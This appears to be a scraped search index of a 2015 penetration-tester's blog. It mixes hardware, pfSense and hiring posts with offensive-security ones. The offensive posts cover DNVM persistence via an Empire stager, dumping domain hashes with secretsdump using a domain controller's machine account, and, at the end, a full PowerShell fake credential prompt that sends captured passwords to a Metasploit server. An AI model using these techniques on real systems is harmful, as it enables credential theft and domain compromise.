500 GB M.2 3.5-Inch SSD (MZ-N5E500BW) $194.99 by Samsung Link: http://amzn.com/B00TGIW1XG ","date":"2015-11-18","objectID":"https://malicious.link/posts/2015/intel-nuc-super-server/:0:2","tags":["nuc","server","intel","esxi"],"title":"Intel NUC Super Server","uri":"https://malicious.link/posts/2015/intel-nuc-super-server/"},{"categories":null,"content":" Samsung 850 EVO 1 TB 2.5-Inch SATA III Internal SSD (MZ-75E1T0B/AM) $346.99 by Samsung Link: http://amzn.com/B00OBRFFAS ","date":"2015-11-18","objectID":"https://malicious.link/posts/2015/intel-nuc-super-server/:0:3","tags":["nuc","server","intel","esxi"],"title":"Intel NUC Super Server","uri":"https://malicious.link/posts/2015/intel-nuc-super-server/"},{"categories":null,"content":" Crucial (PC3L-12800) SODIMM 204-Pin Memory CT204864BF160B $326.31 by Crucial Link: http://amzn.com/B011ISG132 Total Cost: 1328.28 I have gone back and forth between virtualization software (ESXi and Xen mostly) Xen works out of the box but only has a decent interface in it’s Windows GUI. OpenXenManager for Linux is ok. and Xen Orchestrator (Web UI) leaves a bit to be desired. If you’re ok with keeping a Windows box around, Xen is the superior choice when it comes to feature sets. (Mainly clone and templating out of the gate and free) If you do go the ESXi route follow steps here: https://www.virten.net/2015/03/esxi-6-0-image-for-intel-nuc/ because it doesn’t work out of the box. I did create the ISO already, so if you want to use the one I made you can find it here: https://dl.dropboxusercontent.com/u/2627512/ESXi-6.0.0.update01-3073146-NUC.iso You may run into the Manufacturer and Model being random strings (question marks in diamonds), but you can follow: http://www.virten.net/2015/02/how-to-install-esxi-on-5th-gen-intel-nuc-nic-and-ahci-workaround/ Again, I’ve already done these steps so you can download the pre-built BIOS rom here: https://dl.dropboxusercontent.com/u/2627512/RY0350-FIXED.bio ","date":"2015-11-18","objectID":"https://malicious.link/posts/2015/intel-nuc-super-server/:0:4","tags":["nuc","server","intel","esxi"],"title":"Intel NUC Super Server","uri":"https://malicious.link/posts/2015/intel-nuc-super-server/"},{"categories":null,"content":"WARNING: I doubt the BIOS is universal so if you don’t buy the NUC listed above, you probably want to just follow the steps yourself. Flashing a BIOS with the wrong ROM could brick the device. ","date":"2015-11-18","objectID":"https://malicious.link/posts/2015/intel-nuc-super-server/:0:5","tags":["nuc","server","intel","esxi"],"title":"Intel NUC Super Server","uri":"https://malicious.link/posts/2015/intel-nuc-super-server/"},{"categories":null,"content":"Meterpreter’s STDAPI extension (the one that always gets loaded) has a new command. This doesn’t happen very often so it’s worth noting. The new command prints out the currently attached “mounts”. In windows world, that means the normal CD ROM, C drive, etc, but it also means all of the mounted network drives as well. This gets very interesting when you happen to find yourself in a VM environment where you can start writing files to the host: meterpreter \u003e show_mount Mounts / Drives =============== Name Type Size (Total) Size (Free) Mapped to ---- ---- ------------ ----------- --------- A:\\ removable 0.00 B 0.00 B C:\\ fixed 59.90 GiB 28.15 GiB D:\\ cdrom 0.00 B 0.00 B Z:\\ remote 64.78 GiB 18.09 GiB \\\\vmware-host\\Shared Folders\\ I’ll leave the rest up to your imagination for now. But we will come back to this very soon. Huge thanks to @TheColonial - OJ for implementing this much needed option. Merged pull request is here: https://github.com/rapid7/metasploit-framework/pull/6146 ","date":"2015-11-02","objectID":"https://malicious.link/posts/2015/meterpreter-show-mount/:0:0","tags":["meterpreter","shares","showmount"],"title":"Meterpreter show_mount","uri":"https://malicious.link/posts/2015/meterpreter-show-mount/"},{"categories":null,"content":"Time is a one-time non-renewable precious resource you are given. It is ok to be greedy, selective, and even snobbish about how, and with whom you spend it. If it helps, think of your time as a vault, money is withdrawn at a constant rate by people as you spend it, but you are not allowed to look inside to see how much you have left. It could be a billion dollars, it could be .25 cents. If it were money, who would you spend it on if that were the case? Most likely you would be more cautious on who and what you spent any amount on. (This is not to say you live a hermit, but pushing you to actively choose what you want instead of letting life happen and spending your resource) Also, respect other’s choice to spend their time with you. I know we don’t always acknowledge it, but we should be a bit more cognizant of it. We actually dismiss it nonchalantly, in English, with simple phrasing changes like “Thank you for spending THE time”. When we should probably say “Thank you for spending YOUR time”. I have heard it both ways and much more the latter, but it just struck me as I was writing the close to this blog post that I was about to do what I had just warned against. So, in closing, thank you for spending your precious moments reading my blog. Rob ","date":"2015-10-25","objectID":"https://malicious.link/posts/2015/time/:0:0","tags":["rant","time"],"title":"Time","uri":"https://malicious.link/posts/2015/time/"},{"categories":null,"content":"I recently took the plunge and joined a startup called R5 Industries. I wanted to say thanks for all the well wishes that I received on social media. It has certainly calmed my nerves about the choice ;-). I’ve had a number of people ask what R5 Industries does. Our primary selling point is AntigenC2, which is a really Command and Control detection product (no agents). But we also do Red Team assessments and some other fun toys if you are interested, contact@r5industries.com More info here: http://r5industries.com/ And thats the end and last sales pitch you’ll get from me on the subject. Why did I make the move? While, I loved life as an internal Red Team member (highly recommended, if you need reasons why make sure you watch Chris Gates’ talk at RuxCon: https://ruxcon.org.au/speakers/#Chris Gates ) where I got to help steer the boat of a Fortune 10 company, I had a number of opportunities that I had to turn down because of it, even though my higher ups went above and beyond to give me as much latitude as possible. I had a bunch of crazy project ideas that I wanted to see come to life over the years, I don’t think I would have ever had the time to see them become anything more than mythical ideas without this opportunity. So, wish me luck, send me work (as I can finally accept it ;-) [through R5 of course]) and look out for some pretty wacky ideas and products that I’ve been talking about for years. Thanks again, I wouldn’t be here without you. Rob ","date":"2015-10-14","objectID":"https://malicious.link/posts/2015/r5-industries/:0:0","tags":["rant","r5industries"],"title":"R5 Industries","uri":"https://malicious.link/posts/2015/r5-industries/"},{"categories":null,"content":"One of the best resources for persistence mechanisms is Hexacorn’s blog. http://www.hexacorn.com/blog/category/autostart-persistence/ If you haven’t checked out his “Beyond good ol’ Run key” (linked above) 32 post series, you really should. But today I wanted to talk about one that I didn’t see up there: DNVM (https://github.com/aspnet/dnvm) is the DotNet Version Manager and it’s a part of ASP.NET 5, which I believe has been inside of Visual Studio since the 2013 version. It’s there to help to specify which runtime to use for applications, much like RVM (Ruby Version Manager) is for Ruby. With their goal being that you can install .Net and run .Net applications on Linux and Mac as well using DNVM. Once installed it adds a “DNX_HOME” environmental variable: Inside the folder specified are 3 directories: There are plenty of things to play with in here, but I wanted to specifically point out that the BIN directory is put into the $PATH variable (as well as two others) C:\\WINDOWS\\system32\\config\\systemprofile\\.dnx\\bin (DOES NOT EXIST BY DEFAULT) C:\\Program Files\\Microsoft DNX\\Dnvm\\ C:\\Users\\mubix\\.dnx\\bin Ok, not a big deal right? Even a user under UAC can edit their own $PATH variable (we’ll come back to that in another post) Lets take a look at what is in those folders: Interesting, why don’t we see what the command dnvm does: Seriously… I probably don’t even have to continue at this point… But, if I run dnvm from the command prompt (as a developer would) it runs it from inside that protected directory in Program Files right?… RIGHT?! Nope.. Edit the dnvm.cmd with a bit of PowerShell Empire stager (minus the -W Hidden, because we need the user to actually get the output of the dnvm command) and…. [+] Initial agent UU2YKZ3VDG2AUKFY from 192.168.1.109 now active Boom! Lets look a bit into how DNVM works to see if there is something juicier there (way to much for a single blog post) Awesome! So I can modify things in the runtime directory, lets look in there: Lots, of fun, but we still have to wait until they run some C# code with that run time and guess which one they will use (or backdoor all of them). I would rather just make a modification to the dnvm.cmd and be done with it. Simple and clean. Oh did I mention that this is used to cross compile binaries? Ya, oh ok, so you can infect the built binaries, or web apps for Windows, Linux and OSX… Oh and one other thing caught my eye while I was looking into the DNVM.ps1 script: Have fun! P.S. Unquoted paths FTW: https://github.com/aspnet/dnvm/pull/357 ","date":"2015-10-05","objectID":"https://malicious.link/posts/2015/dotnet-dnvm-for-persistence-on-developer-machines/:0:0","tags":["persistence","windows","dotnet","dnvm"],"title":"DotNet's DNVM For Persistence On Developer Machines","uri":"https://malicious.link/posts/2015/dotnet-dnvm-for-persistence-on-developer-machines/"},{"categories":null,"content":"If you found this post via a search, you are probably like me, “not great” at keeping your desktop clear “stuff” (you probably have a ‘stuff’ folder you once put stuff in and forgot about). If you are, and you go into a presentation, you probably don’t want to have all of your icons visible (and possibly recorded). Hiding your desktop icons on Windows (since 7 I believe) is pretty simple. src: http://www.thewindowsclub.com/desktop-icons-not-showing-windows-7 On OSX, its not as straight forward. Following a tip I found here: http://hints.macworld.com/article.php?story=20100804092806364 I was able to create a keyboard shortcut to hide, or unshide everything. First, open up “Automator” and create a new document / “Service” Then drag and drop “Run AppleScript” from the Utilities section: Next, make sure it says that the service doesn’t accept input from any application: Paste in the following script: on run {input, parameters} set myAnswer to (do shell script \"defaults read com.apple.finder CreateDesktop\") as boolean do shell script \"defaults write com.apple.finder CreateDesktop \" \u0026 ((not myAnswer) as string) do shell script \"killall Finder\" end run On the first run, you may get an error stating that the variable doesn’t exist or that it couldn’t convert it into a boolen. This is because by default this variable doesn’t exist for new users. All you have to do to correct this is open a terminal and type: defaults write com.apple.finder CreateDesktop true To set it for the first time: Back in Automator, re-do the test run of the script: Save the file and then you can setup up a keyboard shortcut in System Preferences: Hit Control+Cmd+H to your hearts content. ","date":"2015-10-02","objectID":"https://malicious.link/posts/2015/hiding-desktop-icons-for-presentations-on-osx/:0:0","tags":["presenting","osx","tips"],"title":"Hiding Desktop Icons For Presentations On OSX","uri":"https://malicious.link/posts/2015/hiding-desktop-icons-for-presentations-on-osx/"},{"categories":null,"content":"Today I was asked by @Krystropolis for a “Hello” and maybe some hacking advice, see tweet: I thought about it on my entire 1 hour drive home from just turning in my badge and laptop from a big corporation to go work at a start up. I thought about talking about ethics and data handling, to Geo-politics. I mean, what kind of hacking are we talking about. I finally ended up thinking about what would have been the best advice for me, growing up, for “how to learn hacking”, and I boiled it down right before I pulled into my drive way to two words: “Build It”. For me personally, I didn’t start to really understand attackers, attacks, or even simple defense strategies until I started to try to build it myself. For many hackers (and mechanics, my father included) they started by taking things a part first, then putting them back together (usually with a few extra screws or parts that “didn’t matter” on the side). But for me, I learned best, by building from scratch. This went from stealing RAM for the “old junk” computer locker from my high school to upgrade my Mom’s 95 Mhz Pentium (OH YA!) - in my defense, the computer science teacher told me that I could take anything I needed to build a computer and he didn’t specify the physical location that computer had to be in - all the way to working on the sensor grid for the Marine Corps networks when I helped at the MARCERT as a level 1 tech. I even convinced a few of the Hak5 crew at the time to let me build Gentoo (Stage 3 baby!) on their laptops because it was tons faster (once everything compiled 10 years later). Man do I ramble. Point is. If you want to learn hacking, or how to hack, you need to know a system inside and out first. System (noun) in it’s most basic sense. The best penetration testers / hackers I have ever known are the ones that have rebuilt their labs/phone/widget for the 500th time. UPDATE: I have had a few comments, about the post already. But what I forgot to point out is that by building a system or network you not only get to know the ins and outs of how it works, and what shortcuts you had to take to get it to actually work, but also the appreciation of what it took for you to build it, the hours/research that went into it, how it connects to other systems and clients, and finally what kind of business impact it could or does have on actual corporations. These are core skills to be an effective communicator of risk and need, while keeping compassion for the requirements and business impact. Highly sought after skills in the job market. I hope this helps. Rob ","date":"2015-09-24","objectID":"https://malicious.link/posts/2015/hacking-advice-for-krystropolis/:0:0","tags":["rant","advice"],"title":"Hacking Advice For @Krystropolis","uri":"https://malicious.link/posts/2015/hacking-advice-for-krystropolis/"},{"categories":null,"content":"AKA - ROB WRITES POWERSHELL!! Yesterday I posted a way to dump hashes using a Domain Controller account. But how do you know which account to use? And when was it’s password last set? net user unfortunately won’t do computer accounts. So I decided to write a PowerShell script to find out. Unfortunately Windows 7 doesn’t come with the ActiveDirectory PowerShell module (I’m sure there is another way to do this but here is how I did it. Installed the Remote Server Administration Tools - http://blogs.msdn.com/b/rkramesh/archive/2012/01/17/how-to-add-active-directory-module-in-powershell-in-windows-7.aspx (Not stealthy) Then I was able to use the follow janky script I wrote to find all of the PasswordLastSet values for all of the Domain Controllers Import-Module ActiveDirectory $dclist = Get-ADDomainController -Filter { isGlobalCatalog -eq $true } | Select-Object Name Foreach ($dc in $dclist) { $lastset = Get-ADComputer $dc.Name -property PasswordLastSet Write-Host \"$($dc.Name) - $($lastset.PasswordLastSet)\" } This would probably be an awesome recon / situational awareness module for Empire ( https://github.com/PowerShellEmpire/Empire ) but written better hopefully. Output is pretty simple, it looks like this: DC1 - 09/15/2015 07:05:40 Now I know that I have about 29 days left of valid use of that hash. ","date":"2015-09-16","objectID":"https://malicious.link/posts/2015/get-passwordlastset-time-for-domain-controller-accounts/:0:0","tags":["powershell","domain controllers","passwords","defense"],"title":"Get PasswordLastSet Time For Domain Controller Accounts","uri":"https://malicious.link/posts/2015/get-passwordlastset-time-for-domain-controller-accounts/"},{"categories":null,"content":"Since I follow both Carlos Perez and Benjamin Delpy on Twitter, something caught my eye on August 2nd, soon after Benjamin Delpy drops DCSync: @Carlos_Perez haha, if yes, it will be a 0d ;) No, like always it needs some rights ;) DA is cool, maybe DC$ is enough — 🥝🏳️‍🌈 Benjamin Delpy (@gentilkiwi) August 2, 2015 And then later on August 28th, again about the DC$ account (Domain Controller computer account): #mimikatz DCSync make logs with 'Directory Service Access' DS-Replication-Get-Changes* Except if you use a DC account pic.twitter.com/QAChOGU3z7 — 🥝🏳️‍🌈 Benjamin Delpy (@gentilkiwi) August 28, 2015 Because DCSync is calling on “sync” based APIs of Active Directory, that are, by default, used only by Domain Controllers, all Domain Controller computer accounts would have the ability to do this as well as the Domain/Enterprise Admins. Anyone who’s ever administered an Active Directory, knows that computer accounts change their passwords automatically. How often do they change them? https://support.microsoft.com/en-us/kb/154501: “Machine account passwords are regularly changed for security purposes. By default, on Windows NT-based computers, the machine account password automatically changes every seven days. Starting with Windows 2000-based computers, the machine account password automatically changes every 30 days.” PSSSST!! That article is about how to DISABLE automatic password changing Alright. So, I’m not going to go into “how” to get the hashes for a computer account, but if you’ve ever dumped passwords before, the computer accounts are the ones with the “$” on the end. Find the ones that are domain controllers, match up the hashes, and use Impacket’s secretsdump.py to your heart’s content. (Or until the password changes for that DC, then you use another one to dump it again, oh, did I not mention that computers don’t change their passwords all at the same time in that 30 day window?) Remember, Domain Controller’s don’t have a lot of other permissions, so you need to use the “-just-dc” option in SecretsDump in order for it to just do the domain dump: python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\\$@172.16.102.15 Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Happy #HackersDay ","date":"2015-09-15","objectID":"https://malicious.link/posts/2015/using-domain-controller-account-passwords-to-hashdump-domains/:0:0","tags":["domain controllers","dcsync","hashdump","passwords","mimikatz"],"title":"Using Domain Controller Account Passwords To HashDump Domains","uri":"https://malicious.link/posts/2015/using-domain-controller-account-passwords-to-hashdump-domains/"},{"categories":null,"content":"It’s often tough from both hiring and job hunters to find one another at conferences. I think this is mostly because of a couple things. No one wants to stand at a booth on either side and talk job stuff in front of a bunch of people and people at booths rarely get the chance to get away. It’s hard to know “who” to talk to. So I created a very simple Google doc to help put twitter handles and links together for people who are job hunting and people who are hiring to kinda get to know who to talk to. Got more to add? Please let me know and I’ll get it added, or simply make a comment on the Google doc with the info to add For reference on how this works, see the 2015 ShmooCon list Link to the google doc: https://docs.google.com/spreadsheets/d/16TyaalxEilYN_QKIP3GxBMyQ2Kw8YYIj9_j-rgzLiFc ","date":"2015-09-14","objectID":"https://malicious.link/posts/2015/2015-derbycon-hiring-list/:0:0","tags":["derbycon","hiring"],"title":"2015 DerbyCon Hiring List","uri":"https://malicious.link/posts/2015/2015-derbycon-hiring-list/"},{"categories":null,"content":" The teflon crew at Pied Piper suffered quite a bit during Season 2 of SILICON VALLEY. But there was no greater indignity than being brought to their knees by a tequila bottle. Since episode eight “White Hat/Black Hat” aired, many skeptical viewers have asked: how could something like this happen? Could a mindless error of pressing a delete key really cause a venerable company like Intersite to lose over nine thousand hours of content (including an irreplaceable archive of vintage yiffing videos)? The short answer: yes. When the producers of SILICON VALLEY reached out to me during the writing of the episode to help design the sequence, I knew it would be tough to make the technical intricacies track for the joke. But if the team had figured out optimal tip-to-tip of efficiency with Stanford PhDs, I was up for the challenge. The delete key hack is a perfect storm of bad system hygiene. The dozens of small errors that led to it are more common than most systems administrators care to admit. There’s a lesson here. Away from the big headlines about hacks at Sony Pictures and Target, companies every day have their systems broken by stupid errors. Most as avoidable as not putting a tequila bottle on a laptop (or letting Russ Hanneman inside your home in the first place). Below is the the post-mortem on how the hack went down and tres lessons we can learn from it. The Bake-Off ![](/images/2015/tres_bakeoff.png) Intersite set up the bake-off between Endframe and Pied Piper by providing access to an FTP server with the target files. Each company then downloads the individual files, encodes, compresses and roundtrips the file back to the Intersite server. To speed up the process of the compression, the companies sequentially encode each file to save hard drive space and time waiting for them all to copy down, then they perform the operation. This is where all the problems originate: to deliver the compressed file, Pied Piper was given full permission to Intersite’s FTP server (because of course it’s easier to just give all permissions than manage every folder’s permissions). For those interested, the final Pied Piper solution for Intersite would look something like this: The Hack ![](/images/2015/tres_del.png) When Russ sets down the Tres Comas tequila bottle on Richard’s laptop he unwittingly initiates a massive delete sequence on Intersite’s server. Here are the steps: Richard navigates to bake-off directory or with the extended permissions he got into a parent folder with original content. Gilfoyle turns off the delete verification prompts in the custom software they used for the file transfer and conversion. Richard meanwhile has enabled CRC checking on the internet system, a protection measure for penetration into Pied Piper that backfires. Russ Hanneman arrives with the Tres Comas Tequila and mistakenly sets the bottle down on the keyboard initiating a delete command. Chaos ensues. As the delete sequence launches the large file size of video spins the disks at 100% and locks the system. Hands-on access with the bottle with the persistent delete requests plus the CRC checking creates fork bomb-like effects where the Pied Piper team cannot get back into the system to stop the delete sequence. Intersite is compromised and thousands of hours of video are deleted. Tres Issues ![](/images/2015/tres_preso.png) A myriad of problems contributed to the delete key hack. Using the OWASP framework here are the top tres issues: ","date":"2015-09-10","objectID":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/:0:0","tags":["hbo","silicon valley"],"title":"Tres Lessons From Pied Piper Delete Key Hack","uri":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/"},{"categories":null,"content":"A7 - Missing Function Level Access Control “PITA Administration” Intersite’s FTP server is set up to allow the bake-off users full permissions to the digital masters being used in the bake-off. But why were they unable to kill the transfer? There are a bunch of reasons this could happen – the SAN of which they were FTP’ed into was doing massive amounts of data deletion which can be HDD intensive (try deleting over 9000 files and watch your computer crawl). But they would still be able to kill it on the Pied Piper end?! Not if the transfer agent was queuing up deletes as fast as it could, pegging out the server on the Pied Piper end as well. Remember, everything they had in their garage data center was going into making the conversions go as fast as possible, the transfer back was a lower priority. ","date":"2015-09-10","objectID":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/:1:0","tags":["hbo","silicon valley"],"title":"Tres Lessons From Pied Piper Delete Key Hack","uri":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/"},{"categories":null,"content":"A4 - Insecure Direct Object Reference “speed is everything” By not locking out his screen and letting Russ Hanneman near his unsecured session where he was monitoring the transfer from, Richard allowed direct access to the “delete” key object. But why didn’t it prompt for approving the delete? Basically when you’re in a bake-off like this, you do absolutely everything to remove any possible obstacles, like ANY prompts or approvals that you might not be around to hit “OK” on. ","date":"2015-09-10","objectID":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/:2:0","tags":["hbo","silicon valley"],"title":"Tres Lessons From Pied Piper Delete Key Hack","uri":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/"},{"categories":null,"content":"A6 - Sensitive Data Exposure “We must run forward simply to stay in place” Intersite did not do a proper backup of their files due to cost and size constraints on their current system. In Episode 7 “Adult Content,” Molly Kendall, Intersite’s CEO, talked about how the porn industry was barely making the bills due to “free” internet porn influx. Intersite was doing its best to stay afloat in its industry and, as such, cut corners not only in the lack of proper admin for their FTP server, but also in storage costs. A mistake they will probably not make again soon. Tres Lessons ![](/images/2015/tres_eyebrow.png) ","date":"2015-09-10","objectID":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/:3:0","tags":["hbo","silicon valley"],"title":"Tres Lessons From Pied Piper Delete Key Hack","uri":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/"},{"categories":null,"content":"Don’t be an idiot with permissions: The easiest way in is through the front door. Ensure that everyone is on a need-to-know basis with data. Standard protections like 2-factor authentication and whitelisting IP addresses mean nothing if the wrong people access sensitive information. ","date":"2015-09-10","objectID":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/:4:0","tags":["hbo","silicon valley"],"title":"Tres Lessons From Pied Piper Delete Key Hack","uri":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/"},{"categories":null,"content":"Back up your data: It’s easy to take for granted but reliable storage is still expensive. Most small businesses don’t backup data on a daily basis. Even fewer do so with any form of redundancy or integrity checks. ","date":"2015-09-10","objectID":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/:5:0","tags":["hbo","silicon valley"],"title":"Tres Lessons From Pied Piper Delete Key Hack","uri":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/"},{"categories":null,"content":"Don’t work with assholes: Insider attacks are the hardest to detect and protect against. [Surveys](http://downloads.spectorsoft.com/resources/infographic/spectorsoft-2014-insider-threat-survey.pdf) estimate 59% go unnoticed until it is too late. The first line of defense is common sense, only hire people you trust — and definitely not anyone who put radio on the Internet. ","date":"2015-09-10","objectID":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/:6:0","tags":["hbo","silicon valley"],"title":"Tres Lessons From Pied Piper Delete Key Hack","uri":"https://malicious.link/posts/2015/tres-lessons-from-pied-piper-delete-key-hack/"},{"categories":null,"content":"I’ve had my fare share of “trying new things” after SquareSpace. I tried Ghost, Octopress, Wordpress, and about 30 others in between. All the blogging platforms I tried had some major issues that I didn’t like. I’m sure at some point I’ll write about them but this post is mostly just to announce I finally have given up the fight for finding the perfect blogging platform and I’m just going to blog on Blogger from now on. One of the main reasons for just giving in was the fact that I noticed that because I was doing conversion of 500+ blog posts every time I wanted to switch platforms I was constantly “not in the mood” to blog, which kinda negates the whole purpose of finding a new platform. Anywho, rant over. I should be back on the clock now, hopefully bringing cool stuff here in the weeks and months to come. ","date":"2015-09-07","objectID":"https://malicious.link/posts/2015/back-to-blogger/:0:0","tags":["blogging"],"title":"Back to Blogger","uri":"https://malicious.link/posts/2015/back-to-blogger/"},{"categories":null,"content":"A while back I needed to set up a pfSense box for CTF/example stuff that didn’t and wouldn’t ever have Internet connectivity. Doesn’t seem like much of a task right? Just pop it in and go. Problem is that you loose the use of the packages that help make pfSense so awesome. Once I figured it out at that time, I made a Forum post so that anyone running into the same issue wouldn’t have to struggle as much: https://forum.pfsense.org/index.php?topic=55504.0 Most things never disappear from the Internet but I was looking for an old forum post I had bookmarked regarding some persistence methods that I noticed was no longer there since the forum owner had gotten rid of the forum as too much hassle. I get it, but when I went to Archive.org to get saved they didn’t have a copy. So this is what this post is for, to save that content just in case it disappears. Also, here is a bug report for the “issue” (been open since 2012): http://redmine.pfsense.org/issues/2586 If you are following: http://doc.pfsense.org/index.php/Creating_Your_Own_Package_Repository and you are getting: Unable to communicate with 192.168.1.100 Please verify DNS and interface configuration, and that pfSense has functional Internet connectivity. because you are using the repo to enable a offline (non internet connected) host to be able to utilize packages all you have to do is: Go into Services -\u003e DNS Forwarder and add a Host Override Host: www Domain: pfsense.org IP Address: 127.0.0.1 Description: null routed record to enable offline repo Then make sure you have the IP or hostname of your package repository web server in the /pkg_mgr_settings.php (on 2.0, follow the guidelines on the doc above for older versions). After that you should be good to go. Of course this is barring any Firewall blockages you might have in place so be sure to test connectivity from the pfSense box to the web server. So, that was just the beginning, it’s actually better to not null-route it but make the following entries: files.pfsense.org - 192.168.1.100 files.pfsense.com - 192.168.1.100 www.pfsense.org - 192.168.1.100 www.pfsense.com - 192.168.1.100 If your package web server is 192.168.1.100. Next is the problem of not having the packages themselves. So wget -mk -np http://files.pfsense.org/packages/ gave me a directory that I plopped into my already existant packages directory (created from the git clone as described in the documentation) but the problem I ran into was the php files being rendered still (which made any packages that pulled php files get the rendered version instead of source). So you need to add a .htaccess file in the packages directory with the following: RemoveHandler .php .phtml .php3 RemoveType .php .phtml .php3 php_flag engine off Make sure that AllowOverride all is enabled if you are running Apache to host the package site, if not, you’ll have to google how to allow .htaccess files for your particular server. (or if you server doesn’t support htaccess files then how to enable source disclosure) After those alterations I seem to be off to the races for the most part. Some packages pull from other websites, but altering the package_8.xml or just rerouting the dns seems to solve most of those issues. ","date":"2015-02-17","objectID":"https://malicious.link/posts/2015/pfsense-without-internets/:0:0","tags":["pfsense","configuration"],"title":"pfSense without Internets","uri":"https://malicious.link/posts/2015/pfsense-without-internets/"},{"categories":null,"content":"It’s often tough from both hiring and job hunters to find one another at conferences. I think this is mostly because of a couple things. No one wants to stand at a booth on either side and talk job stuff in front of a bunch of people and people at booths rarely get the chance to get away. It’s hard to know “who” to talk to. So I created a very simple Google doc to help put twitter handles and links together for people who are job hunting and people who are hiring to kinda get to know who to talk to. Got more to add? Please let me know and I’ll get it added, or simply make a comment on the Google doc with the info to add Link to the doc is here: https://docs.google.com/spreadsheets/d/1TytbnvqekJEF0jxLANe6sNa5fu05dFaHEP7zudlJej0/edit?usp=sharing Hope this helps, Rob ","date":"2015-01-13","objectID":"https://malicious.link/posts/2015/2015-shmoocon-hiring/:0:0","tags":["shmoocon","hiring","community"],"title":"2015 ShmooCon Hiring","uri":"https://malicious.link/posts/2015/2015-shmoocon-hiring/"},{"categories":null,"content":"Metasploit Minute has entered into it’s 3rd “season”. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-) Here is the video: Here is the code: $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + \"\\\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = new-object net.webclient; $wc.Headers.Add(\"User-Agent\",\"Wget/1.9+cvs-stable (Red Hat modified)\"); $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy; $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, ''); $result = $wc.downloadstring('https://172.16.102.163'); Lets break down the code line by line: $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserName,[Environment]::UserDomainName); This tells windows to prompt for credentials, with the title of “Failed Authentication”, no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy. [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later $wc = new-object net.webclient; $wc.Headers.Add(\"User-Agent\",\"Wget/1.9+cvs-stable (Red Hat modified)\"); Creates a new webclient object and sets its user agent to ‘wget’ $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy; $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings. $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, ''); Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user. $result = $wc.downloadstring('https://172.16.102.163'); And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds. cat power.txt | iconv --to-code UTF-16LE | base64 